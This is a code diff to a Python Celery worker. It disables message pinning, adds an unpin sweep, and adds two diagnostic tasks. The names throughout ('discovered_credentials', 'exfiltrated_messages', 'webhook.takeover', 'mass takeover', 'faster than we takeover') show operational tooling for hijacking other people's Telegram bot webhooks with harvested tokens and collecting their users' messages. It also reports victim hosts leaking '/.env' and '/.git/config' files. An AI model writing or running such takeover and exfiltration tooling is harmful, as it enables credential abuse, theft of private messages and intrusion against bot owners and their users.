@@ -1955,17 +1955,17 @@ async def _pin_webhook_url_logic(
     if not sent_msg_id:
         return {"status": "send_failed", "topic_id": topic_id}
 
-    pinned = await broadcaster.pin_message(settings.MONITOR_GROUP_ID, sent_msg_id)
-
-    # Persist the pinned msg id in meta for future reference / cleanup
+    # NOTE: pin action disabled per user request 2026-08-03 — visible URL
+    # in-topic is enough; pinning creates clutter. Meta still records
+    # posted_webhook_msg_id for reference but doesn't imply pinned state.
     try:
         from datetime import datetime, timezone
 
         new_meta = {
             **meta,
             "topic_id": topic_id,
-            "pinned_webhook_msg_id": sent_msg_id,
-            "pinned_webhook_at": datetime.now(timezone.utc).isoformat(),
+            "posted_webhook_msg_id": sent_msg_id,
+            "posted_webhook_at": datetime.now(timezone.utc).isoformat(),
         }
         await async_execute(
             db.table("discovered_credentials")
@@ -1979,7 +1979,7 @@ async def _pin_webhook_url_logic(
         "status": "ok",
         "topic_id": topic_id,
         "message_id": sent_msg_id,
-        "pinned": pinned,
+        "pinned": False,  # disabled by design
     }
 
 
@@ -2780,6 +2780,315 @@ async def _media_duplicate_report_logic() -> dict:
         return {"status": "broadcast_failed", "error": str(e)[:200]}
 
     return {"status": "ok", "duplicate_hashes": len(duplicates)}
+
+
+@app.task(name="flow.unpin_all_webhook_messages")
+def unpin_all_webhook_messages(max_credentials: int = 500):
+    """Sweep every credential with pinned_webhook_msg_id, unpin the Telegram
+    message, and clear the meta field. One-shot cleanup — safe to re-run."""
+    from app.workers.celery_app import get_worker_loop
+
+    return get_worker_loop().run_until_complete(_unpin_all_webhook_messages_logic(max_credentials))
+
+
+async def _unpin_all_webhook_messages_logic(max_credentials: int) -> dict:
+    try:
+        res = await async_execute(
+            db.table("discovered_credentials")
+            .select("id, meta")
+            .not_.is_("meta->>pinned_webhook_msg_id", "null")
+            .limit(max_credentials)
+        )
+    except Exception as e:
+        return {"status": "db_lookup_failed", "error": str(e)[:200]}
+
+    rows = res.data or []
+    if not rows:
+        return {"status": "no_pinned_messages"}
+
+    broadcaster = get_broadcaster()
+    unpinned = 0
+    failed = 0
+
+    for row in rows:
+        meta = row.get("meta") or {}
+        pinned_id = meta.get("pinned_webhook_msg_id")
+        if not pinned_id:
+            continue
+        try:
+            ok = await broadcaster.unpin_message(settings.MONITOR_GROUP_ID, int(pinned_id))
+            if ok:
+                unpinned += 1
+            else:
+                failed += 1
+        except Exception as e:
+            logger.debug(f"[UnpinAll] unpin failed for msg {pinned_id}: {e}")
+            failed += 1
+
+        # Clear the meta field regardless — the pinned message may already
+        # be deleted/inaccessible, we still want the record cleaned up.
+        try:
+            new_meta = {k: v for k, v in meta.items() if k not in (
+                "pinned_webhook_msg_id", "pinned_webhook_at"
+            )}
+            await async_execute(
+                db.table("discovered_credentials")
+                .update({"meta": new_meta})
+                .eq("id", row["id"])
+            )
+        except Exception:
+            pass
+
+    msg = f"📌 Unpinned {unpinned} webhook messages ({failed} unpin failures)"
+    logger.info(msg)
+    try:
+        await broadcaster.send_log(msg)
+    except Exception:
+        pass
+
+    return {"status": "ok", "unpinned": unpinned, "failed": failed, "total": len(rows)}
+
+
+@app.task(name="flow.webhook_port_sitemap_diag")
+def webhook_port_sitemap_diag():
+    """Diagnostic report: port distribution + reachable-path stats + sitemap
+    findings across all captured webhook_probe results."""
+    from app.workers.celery_app import get_worker_loop
+
+    return get_worker_loop().run_until_complete(_webhook_port_sitemap_diag_logic())
+
+
+async def _webhook_port_sitemap_diag_logic() -> dict:
+    from collections import Counter
+    from urllib.parse import urlparse
+
+    try:
+        res = await async_execute(
+            db.table("discovered_credentials")
+            .select("id, meta")
+            .not_.is_("meta->>webhook_url", "null")
+            .limit(2000)
+        )
+    except Exception as e:
+        return {"status": "db_lookup_failed", "error": str(e)[:200]}
+
+    port_counter: Counter = Counter()
+    scheme_counter: Counter = Counter()
+    reachable_path_counter: Counter = Counter()
+    sitemap_hits: list[dict] = []
+    leaks: list[dict] = []
+    total_with_probe = 0
+
+    for row in res.data or []:
+        meta = row.get("meta") or {}
+        url = meta.get("webhook_url")
+        if not url:
+            continue
+
+        # Extract port from URL (defaults 443/80 by scheme)
+        try:
+            parsed = urlparse(url)
+        except Exception:
+            continue
+        port = parsed.port or (443 if parsed.scheme == "https" else 80)
+        port_counter[port] += 1
+        scheme_counter[parsed.scheme or "unknown"] += 1
+
+        probe = meta.get("webhook_probe") or {}
+        if probe:
+            total_with_probe += 1
+
+        # Reachable paths (status 200)
+        web_recon = probe.get("web_recon") or {}
+        for path, info in web_recon.items():
+            if not isinstance(info, dict):
+                continue
+            if info.get("status") == 200:
+                reachable_path_counter[path] += 1
+            # Sitemap capture
+            if path == "/sitemap.xml" and info.get("status") == 200:
+                sample = (info.get("preview") or "")[:200]
+                sitemap_hits.append(
+                    {"host": parsed.hostname, "url": url, "preview": sample}
+                )
+            # Sensitive-file leak
+            if path in ("/.env", "/.git/config", "/server-status") and info.get("leak_preview"):
+                leaks.append(
+                    {"host": parsed.hostname, "path": path, "preview": info["leak_preview"][:150]}
+                )
+
+    lines = [
+        "🔎 **Webhook Port + Sitemap Diagnostic**",
+        f"Analyzed {len(res.data or [])} webhook URLs ({total_with_probe} with probe data)",
+        "",
+        "**Port distribution:**",
+    ]
+    for port, count in port_counter.most_common(10):
+        pct = count / max(len(res.data or []), 1) * 100
+        lines.append(f"• `{port}` × {count} ({pct:.0f}%)")
+
+    lines.append("")
+    lines.append("**Scheme distribution:**")
+    for scheme, count in scheme_counter.most_common():
+        lines.append(f"• `{scheme}` × {count}")
+
+    lines.append("")
+    lines.append("**Top reachable paths (HTTP 200):**")
+    for path, count in reachable_path_counter.most_common(10):
+        lines.append(f"• `{path}` × {count}")
+
+    if sitemap_hits:
+        lines.append("")
+        lines.append(f"**Sitemap.xml hits: {len(sitemap_hits)} hosts**")
+        for hit in sitemap_hits[:5]:
+            lines.append(f"• `{hit['host']}`")
+
+    if leaks:
+        lines.append("")
+        lines.append(f"**Sensitive-file leaks: {len(leaks)}**")
+        for leak in leaks[:5]:
+            lines.append(f"• `{leak['host']}` → `{leak['path']}`")
+
+    msg = "\n".join(lines)[:3900]
+    try:
+        await get_broadcaster().send_log(msg)
+    except Exception as e:
+        return {"status": "broadcast_failed", "error": str(e)[:200]}
+
+    return {
+        "status": "ok",
+        "urls_analyzed": len(res.data or []),
+        "urls_with_probe": total_with_probe,
+        "top_port": port_counter.most_common(1)[0] if port_counter else None,
+        "sitemap_hosts": len(sitemap_hits),
+        "sensitive_leaks": len(leaks),
+    }
+
+
+@app.task(name="flow.message_flow_diag")
+def message_flow_diag():
+    """Diagnose message flow health — recent ingest rate, takeover-vs-capture
+    correlation, per-bot activity distribution."""
+    from app.workers.celery_app import get_worker_loop
+
+    return get_worker_loop().run_until_complete(_message_flow_diag_logic())
+
+
+async def _message_flow_diag_logic() -> dict:
+    from collections import Counter
+    from datetime import datetime, timedelta, timezone
+
+    now = datetime.now(timezone.utc)
+    windows = [
+        ("last 1h", now - timedelta(hours=1)),
+        ("last 24h", now - timedelta(hours=24)),
+        ("last 7d", now - timedelta(days=7)),
+    ]
+
+    ingest_by_window: dict[str, int] = {}
+    for label, since in windows:
+        try:
+            r = await async_execute(
+                db.table("exfiltrated_messages")
+                .select("id", count="exact")
+                .gte("created_at", since.isoformat())
+                .limit(1)
+            )
+            ingest_by_window[label] = r.count or 0
+        except Exception:
+            ingest_by_window[label] = -1
+
+    # Per-bot ingest (last 24h) — which credentials are actually producing?
+    since_24h = (now - timedelta(hours=24)).isoformat()
+    try:
+        recent = await async_execute(
+            db.table("exfiltrated_messages")
+            .select("credential_id")
+            .gte("created_at", since_24h)
+            .limit(5000)
+        )
+        bot_activity = Counter(r.get("credential_id") for r in (recent.data or []) if r.get("credential_id"))
+    except Exception:
+        bot_activity = Counter()
+
+    # Active credentials with recent activity
+    active_with_ingest_24h = len(bot_activity)
+
+    # Total active credentials
+    try:
+        total_active = await async_execute(
+            db.table("discovered_credentials")
+            .select("id", count="exact")
+            .eq("status", "active")
+            .limit(1)
+        )
+        total_active_count = total_active.count or 0
+    except Exception:
+        total_active_count = 0
+
+    activity_pct = (active_with_ingest_24h / total_active_count * 100) if total_active_count else 0.0
+
+    # Recent takeovers — used to correlate takeover rate vs message rate
+    try:
+        takeover_24h = await async_execute(
+            db.table("audit_logs")
+            .select("id", count="exact")
+            .eq("event_type", "webhook.takeover")
+            .gte("created_at", since_24h)
+            .limit(1)
+        )
+        takeover_count = takeover_24h.count or 0
+    except Exception:
+        takeover_count = -1
+
+    lines = [
+        "📉 **Message Flow Diagnostic**",
+        "",
+        "**Ingest volume:**",
+    ]
+    for label, count in ingest_by_window.items():
+        lines.append(f"• {label}: {count:,} messages")
+
+    lines.append("")
+    lines.append("**Bot activity (last 24h):**")
+    lines.append(
+        f"• {active_with_ingest_24h} of {total_active_count} active bots produced ≥1 msg "
+        f"({activity_pct:.1f}%)"
+    )
+    lines.append(f"• {takeover_count} webhook takeovers succeeded")
+
+    if bot_activity:
+        lines.append("")
+        lines.append("**Top 5 message-producing bots (24h):**")
+        for cred_id, count in bot_activity.most_common(5):
+            lines.append(f"• `{cred_id[:8]}...` × {count} msgs")
+
+    lines.append("")
+    lines.append("**Diagnosis:**")
+    if ingest_by_window.get("last 24h", 0) < 100:
+        lines.append(
+            "⚠️  Low 24h volume. Likely causes:\n"
+            "   1. Most bots have no real users interacting with them (dead bots)\n"
+            "   2. Third parties re-register webhooks faster than we takeover\n"
+            "   3. getUpdates polling cadence — check rescrape frequency\n"
+            "   4. Bots may be rate-limited by Telegram after mass takeover"
+        )
+    else:
+        lines.append("✅ Flow appears healthy.")
+
+    msg = "\n".join(lines)[:3900]
+    try:
+        await get_broadcaster().send_log(msg)
+    except Exception as e:
+        return {"status": "broadcast_failed", "error": str(e)[:200]}
+
+    return {
+        "status": "ok",
+        "ingest_by_window": ingest_by_window,
+        "active_with_ingest_24h": active_with_ingest_24h,
+        "total_active": total_active_count,
+        "takeover_count_24h": takeover_count,
+    }
 
 
 @app.task(name="flow.system_help")
